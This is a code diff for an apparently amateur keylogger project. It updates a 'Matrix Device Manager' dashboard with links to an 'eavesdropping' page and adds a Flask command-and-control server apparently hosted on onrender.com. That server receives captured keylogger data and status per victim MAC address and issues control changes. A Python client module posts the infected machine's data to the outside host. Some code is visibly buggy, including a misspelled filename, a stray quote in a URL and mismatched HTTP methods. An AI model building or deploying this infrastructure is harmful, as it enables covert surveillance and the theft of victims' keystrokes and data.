@@ -1,3 +1,4 @@
+@ index.html:
 <!DOCTYPE html>
 <html lang="he" dir="rtl">
 
@@ -5,481 +6,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Matrix Device Manager</title>
-  <style>
-    :root {
-      --matrix-green: #00ff41;
-      --dark-bg: #0d0d1a;
-      --panel-bg: rgba(10, 25, 15, 0.85);
-      --glow: 0 0 15px var(--matrix-green), 0 0 25px rgba(0, 255, 65, 0.5);
-      --neon-red: #ff1a1a;
-      --neon-blue: #00ccff;
-    }
-
-    body {
-      background: linear-gradient(135deg, var(--dark-bg) 0%, #1a2a25 100%);
-      color: var(--matrix-green);
-      font-family: 'Courier New', monospace;
-      margin: 0;
-      padding: 20px;
-      min-height: 100vh;
-      direction: rtl;
-      overflow-x: hidden;
-      position: relative;
-    }
-
-    /* Matrix Rain Background */
-    #matrix-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-      opacity: 0.7;
-      filter: blur(1px);
-    }
-
-    .container {
-      max-width: 1300px;
-      margin: 0 auto;
-      position: relative;
-      z-index: 1;
-    }
-
-    h1 {
-      text-align: center;
-      color: var(--matrix-green);
-      text-shadow: var(--glow);
-      font-size: 2.5em;
-      margin-bottom: 40px;
-      animation: flicker 3s infinite;
-    }
-
-    @keyframes flicker {
-
-      0%,
-      100% {
-        opacity: 1;
-      }
-
-      50% {
-        opacity: 0.8;
-      }
-    }
-
-    /* Device Grid */
-    .devices-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-      gap: 25px;
-      margin-bottom: 40px;
-    }
-
-    .device-card {
-      background: var(--panel-bg);
-      border: 2px solid var(--matrix-green);
-      border-radius: 8px;
-      padding: 20px;
-      box-shadow: var(--glow);
-      position: relative;
-      overflow: hidden;
-      transition: transform 0.3s, box-shadow 0.3s;
-    }
-
-    .device-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 0 20px var(--matrix-green), 0 0 40px rgba(0, 255, 65, 0.3);
-    }
-
-    .device-card::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(0, 255, 65, 0.1) 0%, transparent 70%);
-      animation: rotateGlow 10s linear infinite;
-      z-index: -1;
-    }
-
-    @keyframes rotateGlow {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    .device-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-
-    .device-name {
-      font-size: 1.4em;
-      font-weight: bold;
-      text-shadow: 0 0 5px var(--matrix-green);
-    }
-
-    .status-indicator {
-      width: 15px;
-      height: 15px;
-      border-radius: 50%;
-      display: inline-block;
-      margin-right: 10px;
-      animation: pulseStatus 1.5s infinite;
-    }
-
-    .status-connected {
-      background: var(--matrix-green);
-      box-shadow: var(--glow);
-    }
-
-    .status-disconnected {
-      background: var(--neon-red);
-      box-shadow: 0 0 10px var(--neon-red);
-    }
-
-    @keyframes pulseStatus {
-      0% {
-        transform: scale(1);
-      }
-
-      50% {
-        transform: scale(1.2);
-      }
-
-      100% {
-        transform: scale(1);
-      }
-    }
-
-    .device-info {
-      margin-bottom: 20px;
-      font-size: 0.95em;
-      line-height: 1.6;
-    }
-
-    .button {
-      background: transparent;
-      border: 2px solid var(--matrix-green);
-      color: var(--matrix-green);
-      padding: 10px 20px;
-      cursor: pointer;
-      font-family: 'Courier New', monospace;
-      transition: all 0.3s ease;
-      position: relative;
-      overflow: hidden;
-      margin: 5px 0;
-    }
-
-    .button::after {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 0;
-      height: 0;
-      background: rgba(0, 255, 65, 0.2);
-      transition: all 0.4s ease;
-      border-radius: 50%;
-      transform: translate(-50%, -50%);
-      z-index: -1;
-    }
-
-    .button:hover::after {
-      width: 300%;
-      height: 300%;
-    }
-
-    .button:hover {
-      color: var(--dark-bg);
-      box-shadow: var(--glow);
-    }
-
-    /* Modal */
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.9);
-      z-index: 1000;
-      backdrop-filter: blur(5px);
-    }
-
-    .modal-content {
-      background: var(--panel-bg);
-      border: 2px solid var(--matrix-green);
-      box-shadow: var(--glow);
-      max-width: 550px;
-      margin: 60px auto;
-      padding: 25px;
-      position: relative;
-      border-radius: 10px;
-      animation: modalPop 0.5s ease-out;
-    }
-
-    @keyframes modalPop {
-      0% {
-        transform: scale(0.8);
-        opacity: 0;
-      }
-
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-
-    .close-modal {
-      position: absolute;
-      top: 15px;
-      left: 15px;
-      cursor: pointer;
-      color: var(--matrix-green);
-      font-size: 1.5em;
-      transition: color 0.3s;
-    }
-
-    .close-modal:hover {
-      color: var(--neon-red);
-    }
-
-    input,
-    select {
-      background: rgba(0, 20, 0, 0.9);
-      border: 1px solid var(--matrix-green);
-      color: var(--matrix-green);
-      padding: 10px;
-      margin: 8px 0;
-      width: 100%;
-      font-family: 'Courier New', monospace;
-      box-shadow: inset 0 0 5px var(--matrix-green);
-      transition: border-color 0.3s;
-    }
-
-    input:focus,
-    select:focus {
-      border-color: var(--neon-blue);
-      outline: none;
-    }
-
-    .settings-group {
-      margin-bottom: 20px;
-    }
-
-    .settings-group label {
-      display: block;
-      margin-bottom: 8px;
-      text-shadow: 0 0 3px var(--matrix-green);
-    }
-
-    /* Lock Screen */
-    .lock-screen {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: radial-gradient(circle at center, #1a2a25 0%, var(--dark-bg) 100%);
-      z-index: 2000;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-    }
-
-    .lock-screen.active {
-      display: flex;
-      animation: glitch 0.3s linear;
-    }
-
-    .lock-content {
-      text-align: center;
-      position: relative;
-    }
-
-    .lock-icon {
-      font-size: 6em;
-      color: var(--matrix-green);
-      margin-bottom: 25px;
-      animation: pulse 1.5s infinite;
-      text-shadow: var(--glow);
-    }
-
-    .unlock-form {
-      background: var(--panel-bg);
-      padding: 40px;
-      border: 3px solid var(--matrix-green);
-      box-shadow: var(--glow);
-      position: relative;
-      border-radius: 10px;
-      overflow: hidden;
-    }
-
-    .unlock-form::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -150%;
-      width: 300%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
-      animation: scanWave 3s linear infinite;
-    }
-
-    @keyframes scanWave {
-      0% {
-        transform: translateX(-100%);
-      }
-
-      100% {
-        transform: translateX(100%);
-      }
-    }
-
-    .password-input {
-      background: rgba(0, 20, 0, 0.9);
-      border: 2px solid var(--matrix-green);
-      color: var(--matrix-green);
-      padding: 15px;
-      margin: 15px 0;
-      width: 280px;
-      font-family: 'Courier New', monospace;
-      text-align: center;
-      box-shadow: inset 0 0 10px var(--matrix-green);
-    }
-
-    .unlock-button {
-      background: transparent;
-      border: 2px solid var(--matrix-green);
-      color: var(--matrix-green);
-      padding: 15px 40px;
-      margin-top: 20px;
-      cursor: pointer;
-      font-family: 'Courier New', monospace;
-      transition: all 0.3s;
-      text-transform: uppercase;
-      letter-spacing: 3px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .unlock-button:hover {
-      background: var(--matrix-green);
-      color: var(--dark-bg);
-      box-shadow: var(--glow);
-    }
-
-    @keyframes pulse {
-      0% {
-        transform: scale(1);
-        opacity: 1;
-      }
-
-      50% {
-        transform: scale(1.15);
-        opacity: 0.9;
-      }
-
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-
-    @keyframes glitch {
-      0% {
-        transform: translate(0);
-      }
-
-      20% {
-        transform: translate(-3px, 3px);
-      }
-
-      40% {
-        transform: translate(-3px, -3px);
-      }
-
-      60% {
-        transform: translate(3px, 3px);
-      }
-
-      80% {
-        transform: translate(3px, -3px);
-      }
-
-      100% {
-        transform: translate(0);
-      }
-    }
-
-    .cyber-lines {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: -1;
-    }
-
-    .cyber-lines::before,
-    .cyber-lines::after {
-      content: '';
-      position: absolute;
-      background: var(--matrix-green);
-      opacity: 0.15;
-      animation: scanline 4s linear infinite;
-    }
-
-    .cyber-lines::before {
-      width: 2px;
-      height: 100%;
-      left: 20%;
-    }
-
-    .cyber-lines::after {
-      height: 2px;
-      width: 100%;
-      top: 40%;
-      animation: scanline-horizontal 5s linear infinite;
-    }
-
-    @keyframes scanline {
-      0% {
-        transform: translateY(-100%);
-      }
-
-      100% {
-        transform: translateY(100%);
-      }
-    }
-
-    @keyframes scanline-horizontal {
-      0% {
-        transform: translateX(-100%);
-      }
-
-      100% {
-        transform: translateX(100%);
-      }
-    }
-
-    /* Loading Message */
-    #loadingMessage {
-      text-align: center;
-      font-size: 1.2em;
-      text-shadow: var(--glow);
-      animation: flicker 2s infinite;
-    }
-  </style>
+ 
 </head>
 
 <body>
@@ -649,37 +176,6 @@
 
     let currentMac = null;
 
-    // פונקציה להמרת הנתונים לפורמט אחיד (מערך של מכשירים)
-    function normalizeDevicesData(data) {
-      // אם data הוא מערך כבר - נחזיר אותו ישירות
-      if (Array.isArray(data)) {
-        return data;
-      }
-
-      // אם data הוא אובייקט - נניח שכל מפתח בו הוא כתובת MAC
-      const devicesArray = [];
-      for (const key in data) {
-        if (data.hasOwnProperty(key)) {
-          const device = data[key];
-          // ניתן לעדכן פה את סוגי הנתונים אם צריך
-          device.connected = String(device.connected).toLowerCase() === "true";
-          // ודא ששדה lastSeen מעודכן לפורמט הרצוי, אם צריך ניתן להמיר
-          // נניח שקלט הוא בפורמט dd/mm/YYYY HH:MM ונמיר ל-YYYY-MM-DD HH:MM
-          if (device.lastSeen) {
-            const parts = device.lastSeen.split(' ');
-            if (parts.length === 2) {
-              const dateParts = parts[0].split('/');
-              if (dateParts.length === 3) {
-                device.lastSeen = `${dateParts[2]}-${dateParts[1]}-${dateParts[0]} ${parts[1]}`;
-              }
-            }
-          }
-          devicesArray.push(device);
-        }
-      }
-      return devicesArray;
-    }
-
     // שלב 1: הבאת המכשירים מהשרת
     async function fetchDevices() {
       document.getElementById('loadingMessage').style.display = 'block';
@@ -689,12 +185,11 @@
           throw new Error(`Error fetching devices: ${response.status}`);
         }
         const data = await response.json();
-        console.log('Raw data:', data);
-        if (!data || (Array.isArray(data) && data.length === 0) || (typeof data === 'object' && Object.keys(data).length === 0)) {
+        console.log(data)
+        if (!data || data.length === 0) {
           throw new Error("No devices found in the response");
         }
-        // ננרמל את הנתונים למערך אחיד
-        devices = normalizeDevicesData(data);
+        devices = data;
       } catch (error) {
         console.error('Error fetching devices:', error);
         // במקרה של שגיאה, נשתמש ב־mockDevices כדוגמה
@@ -713,26 +208,25 @@
       for (let i = 0; i < devices.length; i++) {
         const device = devices[i];
         htmlStr += `
-      <div class="device-card">
-        <div class="device-header">
-          <span class="device-name">${device.name || device.macAddress}</span>
-          <span class="status-indicator ${device.connected ? 'status-connected' : 'status-disconnected'}"></span>
-        </div>
-        <div class="device-info">
-          <div>MAC: ${device.macAddress}</div>
-          <div>סטטוס: ${device.connected ? 'מחובר' : 'מנותק'}</div>
-          ${device.timeLimit ? `<div>זמן נותר: ${formatTimeRemaining(device.timeLimit)}</div>` : ''}
-          <div>אחסון: ${device.storageLocation || ''}</div>
-          <div>נראה לאחרונה: ${device.lastSeen || ''}</div>
-        </div>
-        <button class="button" onclick="openSettings('${device.macAddress}')">הגדרות</button>
-        <a class="button" href="eavesdropping.html?mac=${device.macAddress}">צפה בהאזנות</a>
-      </div>
-    `;
+          <div class="device-card">
+            <div class="device-header">
+              <span class="device-name">${device.name || device.macAddress}</span>
+              <span class="status-indicator ${device.connected ? 'status-connected' : 'status-disconnected'}"></span>
+            </div>
+            <div class="device-info">
+              <div>MAC: ${device.macAddress}</div>
+              <div>סטטוס: ${device.connected ? 'מחובר' : 'מנותק'}</div>
+              ${device.timeLimit ? `<div>זמן נותר: ${formatTimeRemaining(device.timeLimit)}</div>` : ''}
+              <div>אחסון: ${device.storageLocation || ''}</div>
+              <div>נראה לאחרונה: ${device.lastSeen || ''}</div>
+            </div>
+            <button class="button" onclick="openSettings('${device.macAddress}')">הגדרות</button>
+            <a class="button" href="eavesdropping.html?mac=${device.macAddress}">צפה בהאזנות</a>
+          </div>
+        `;
       }
       grid.innerHTML = htmlStr;
     }
-
 
     // עוזר: מפרמט זמן מוגבל ב־(דקות->ימים/שעות/דקות)
     function formatTimeRemaining(timeLimit) {
@@ -805,7 +299,6 @@
         closeModal();
         return;
       }
-      changedData["Mac-Address"] = currentMac;
 
       // נמצא את המכשיר הקיים כדי להשוות
       let device = devices.find(d => d.macAddress === currentMac);
@@ -871,12 +364,14 @@
         closeModal();
         return;
       }
+
       // שלב 5: שליחת השינויים בלבד לשרת
       try {
         const response = await fetch(`${SERVER_URL}/api/status/change`, {
-          method: 'POST',
+          method: 'PUT',
           headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
+            'Mac-Address': currentMac
           },
           // שולחים רק את הערכים ששונו, והשאר ריקים – כך מבליטים מה נשמר
           body: JSON.stringify(changedData)
@@ -905,3 +400,281 @@
 
 
 </html>
+
+
+@ server run on https://key-logger-server.onrender.com:
+from flask import Flask, request, jsonify
+import json
+import os
+
+app = Flask(__name__)
+
+
+def write_to_json(name_j, data):
+    """ פונקציה לשמירת נתונים בקובץ JSON """
+    try:
+        file_path = f"{name_j}.json"
+
+        # אם הקובץ קיים - טוענים את הנתונים הקיימים, אחרת יוצרים מילון ריק
+        if os.path.exists(file_path):
+            try:
+                with open(file_path, "r", encoding="utf-8") as file:
+                    data_json = json.load(file)
+            except json.JSONDecodeError:
+                data_json = {}  # אם יש בעיה בקובץ, נאתחל אותו
+        else:
+            data_json = {}
+
+        # עדכון הנתונים
+        data_json.update(data)
+
+        # שמירה חזרה לקובץ
+        with open(file_path, "w", encoding="utf-8") as f:
+            json.dump(data_json, f, ensure_ascii=False, indent=4)
+    except Exception as e:
+        print("❌ שגיאה בכתיבת JSON:", e)  # הדפסת שגיאה
+
+
+@app.route('/api/status/update', methods=['POST'])
+def status_update():
+    print("/api/status/update")
+    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"error": "Invalid JSON"}), 400
+
+        mac_address = data.get("macAddress")
+        if not mac_address:
+            return jsonify({"error": "Missing macAddress"}), 400
+
+        status = {mac_address: data}
+        write_to_json("device_status", status)
+        print("📥 נתונים שהתקבלו:", data)
+        return jsonify({"message": "Success"}), 200
+    except Exception as e:
+        print("❌ שגיאה:", e)
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/data/upload', methods=['POST'])
+def data_upload():
+    """ קבלת נתונים מהקיי לוגר ושמירתם לפי כתובת ה-MAC """
+    print("/api/data/upload")
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"error": "Invalid JSON"}), 400
+
+        mac_address = request.headers.get("mac_address")
+        if not mac_address:
+            return jsonify({"error": "Missing mac_address in headers"}), 400
+
+        write_to_json(mac_address, data)
+        print("📥 נתונים שהתקבלו:", data)
+        return jsonify({"message": "Success"}), 200
+    except Exception as e:
+        print("❌ שגיאה:", e)
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/api/data/files', methods=['GET'])
+def get_data():
+    """ שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC """
+    print("/api/data/files")
+    mac_address = request.headers.get("mac_address")
+    if not mac_address:
+        return jsonify({"error": "Missing mac_address in headers"}), 400
+
+    try:
+        with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
+            data_json = json.load(file)
+            print("📤 נתונים שנשלחו:", data_json)
+        return jsonify(data_json)
+    except FileNotFoundError:
+        return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON file"}), 500
+
+
+@app.route('/api/status/all', methods=['GET'])
+def get_status_all():
+    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף אינטרנט """
+    print("/api/status/all")
+    try:
+        with open("evice_status.json", "r", encoding="utf-8") as file:
+            data_json = json.load(file)
+            print("📤 נתונים שנשלחו:", data_json)
+        return jsonify(data_json)
+    except FileNotFoundError:
+        return jsonify({"error": f"No data found "}), 404
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON file"}), 500
+
+
+@app.route('/api/status/check', methods=['GET'])
+def check_status():
+    """ בדיקת (מהקיי לוגר) הסטטוס האחרון של המכשיר לפי MAC ע"י הקיי לוגר """
+    print("/api/status/check")
+    mac_address = request.headers.get("mac_address")
+    if not mac_address:
+        return jsonify({"error": "Missing mac_address in headers"}), 400
+
+    try:
+        with open("change_device_status.json", "r", encoding="utf-8") as file:
+            status_json = json.load(file)
+            device_status = status_json.get(mac_address)
+
+            if not device_status:
+                return jsonify({"message": "No status found"}), 404
+
+            print("📤 נתונים שנשלחו:", device_status)
+            return jsonify(device_status)
+    except FileNotFoundError:
+        return jsonify({"error": "Status file not found"}), 500
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON file"}), 500
+
+
+@app.route('/api/status/change', methods=['POST'])
+def change_status():
+    """ מקבל נתוני סטטוס מהאתר ושומר בקובץ לפי כתובת ה-MAC """
+    print("api/status/change")
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({"error": "Invalid JSON"}), 400
+
+        mac_address = data.get("Mac-Address")
+        if not mac_address:
+            return jsonify({"error": "Missing macAddress"}), 400
+
+        status = {mac_address: data}
+        write_to_json("change_device_status", status)
+        print("📥 Received data:", data)
+        return jsonify({"message": "Success"}), 200
+    except FileNotFoundError:
+        return jsonify({"error": "Status file not found"}), 500
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON file"}), 500
+    except Exception as e:
+        print("❌ Error:", e)
+        return jsonify({"error": str(e)}), 500
+
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
+
+@ api_server:
+from abc import ABC, abstractmethod
+import requests
+import json
+import uuid
+
+mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
+
+
+class APIServer(ABC):
+    """
+    מחלקה אבסטרקטית לייצוג שרת API.
+    כל מחלקה היורשת ממנה חייבת לממש את המתודה 'interact_with_server'.
+    """
+
+    @abstractmethod
+    def interact_with_server(self, *args, **kwargs):
+        pass
+
+
+class StatusUpdater(APIServer):
+    """
+    שולח בקשת POST לעדכון סטטוס הפרויקט.
+    """
+
+    def interact_with_server(self, status_data):
+
+        url = "https://key-logger-server.onrender.com/api/status/update"
+        try:
+            response = requests.post(url, json=status_data)
+            response.raise_for_status()  # הרם שגיאה עבור קודי סטטוס שגיאה (4xx או 5xx)
+            print(f"------------ הודעה נשלחה בהצלחה ----------------\n {status_data}")
+            return response
+        except requests.exceptions.RequestException as e:
+            print(f"שגיאה בעדכון סטטוס: {e}")
+            return None
+
+
+class DataFileWriter(APIServer):
+    """
+    שולח בקשת POST לעדכון קובץ דאטא של מחשב ספציפי לפי כתובת MAC.
+    """
+
+    def interact_with_server(self, file_data, mac_address=mac_address):
+
+        url = "https://key-logger-server.onrender.com/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
+        try:
+            response = requests.post(url, json=file_data, headers={"mac_address": mac_address})
+            response.raise_for_status()
+            return response
+        except requests.exceptions.RequestException as e:
+            print(f"שגיאה בעדכון קובץ דאטא עבור MAC {mac_address}: {e}")
+            return None
+
+
+class StatusChecker(APIServer):
+    """
+    שולח בקשת GET כדי לדעת האם יש שינויים בסטטוסים.
+    """
+
+    def interact_with_server(self):
+        """
+        שולח בקשת GET לבדיקת שינויים בסטטוסים.
+
+        :return: תגובת השרת (requests.Response).
+        """
+        url = "https://key-logger-server.onrender.com/check_status_changes"  # החלף בכתובת ה-URL האמיתית
+        try:
+            response = requests.get(url)
+            response.raise_for_status()
+            return response
+        except requests.exceptions.RequestException as e:
+            print(f"שגיאה בבדיקת שינויי סטטוס: {e}")
+            return None
+
+
+class RequestManager:
+    """
+    מנהל את הבקשות ומנתב אותן למחלקה המתאימה בהתאם למטודה וסוג הבקשה.
+    """
+
+    def __init__(self):
+        self.status_updater = StatusUpdater()
+        self.data_file_writer = DataFileWriter()
+        self.status_checker = StatusChecker()
+
+    def handle_request(self, method, request_type, kwargs):
+        """
+        מטפל בבקשה ומנתב אותה למחלקה המתאימה.
+
+        :param method: שיטת הבקשה ('GET' או 'POST').
+        :param request_type: סוג הבקשה ('status', 'data', 'dag').
+        :param kwargs: ארגומנטים נוספים שיעברו למתודת 'interact_with_server'.
+        :return: תגובת השרת או None במקרה של שגיאה.
+        :raises ValueError: אם סוג בקשה לא חוקי.
+        """
+        if method.upper() == 'POST':
+            if request_type == 'status':
+                return self.status_updater.interact_with_server(kwargs)
+            elif request_type == 'data':
+                return self.data_file_writer.interact_with_server(kwargs)
+            else:
+                raise ValueError(f"סוג בקשה לא חוקי עבור POST: {request_type}")
+        elif method.upper() == 'GET':
+            if request_type == 'status':
+                return self.status_checker.interact_with_server(kwargs)
+            elif request_type == 'dag':
+                return self.dag_file_fetcher.interact_with_server(kwargs)
+            else:
+                raise ValueError(f"סוג בקשה לא חוקי עבור GET: {request_type}")
+        else:
+            raise ValueError(f"שיטת בקשה לא חוקית: {method}")
